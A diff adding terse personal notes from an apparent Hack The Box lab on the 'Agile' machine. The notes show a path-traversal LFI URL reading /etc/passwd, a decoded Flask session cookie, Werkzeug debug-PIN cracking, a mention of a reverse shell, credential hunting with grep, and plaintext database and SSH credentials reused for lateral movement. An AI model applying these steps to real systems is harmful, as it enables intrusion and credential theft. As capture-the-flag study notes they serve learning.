@@ -1,0 +1,55 @@
+Sometimes the website has an error with the mysql server showing us a debugging page
+with this we can see absolute paths of certain files on the system
+
+http://superpass.htb/download?fn=../../../../../etc/passwd -> LFI
+
+┌──(ender㉿UnDefineCS)-[~/Downloads]
+└─$ flask-unsign --decode --cookie '.eJwlzjEOwzAIAMC_MHewgYDJZyJiQO2aNFPVvzdS51vuA1sdeT5hfR9XPmB7BaygREnUXHNahqQzMpG1bqUkrMWFSN3CzW4tHTI6Kk5H8d0jVaa6OZlbaFMxDqlR0tBmYx6Yfei-hA0WGr4IlfalocRu0wTuyHXm8d90he8PlsouMA.ZK9e4A.rhHFJMHUPuKvvs2WPRvzw645iik'
+{'_fresh': True, '_id': '733e330a7ec9ed6ea424339019f73647f4f22319da996eaf78681272ca26abade76c7a9a39a9d707694d6f8f6029c04482e187b5d984638a563f715026db9c96', '_user_id': '17'}
+
+https://www.bengrewell.com/cracking-flask-werkzeug-console-pin/ -> use final py script
+https://www.youtube.com/watch?v=8dyoBfj7H8U&t=751s&pp=ygUdV2Vya3pldWcgRGVidWcgUGluIGdlbmVyYXRpb24%3D -> good at explaining the chunks
+
+Parts we need: MAC-Address - cgroup - machineID - flask app runner name - flask path
+
+The py code will give u a list of pins, hopefully one of them works! -> when the machine resets the values in the pin script that need changed are [nodeuuids, machineids]
+
+Using an alt method of downloading shell.sh into tmp to execute gives us a rev-shell
+
+grep -rnw '.' -e 'db' 2>/dev/null
+grep -rnw '.' -e 'uri' 2>/dev/null
+grep -rnw '.' -e 'mysql' 2>/dev/null
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+db_session.global_init(app.config['SQL_URI'])
+
+cat config_prod.json
+{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}
+
+mysql -u superpassuser -p
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| performance_schema |
+| superpass          |
++--------------------+
+3 rows in set (0.01 sec)
+
+mysql -u superpassuser -p superpass
+superpassuser:dSA6l7q*yIVs$39Ml6ywvgK
+
+going into the passwords table
+
+we get corum:5db7caa1d13cc37c9fc2 -> Agile ==> SSH CREDS!
+
+scp corum@superpass.htb:./lin.out ./Enum.corum -> download via SSH from Ender terminal
+=============================================================================================
+
+find / -type f -readable -writable | grep -v "/var\|/etc\|/proc\|/sys"
+
+/app/test_and_update.sh
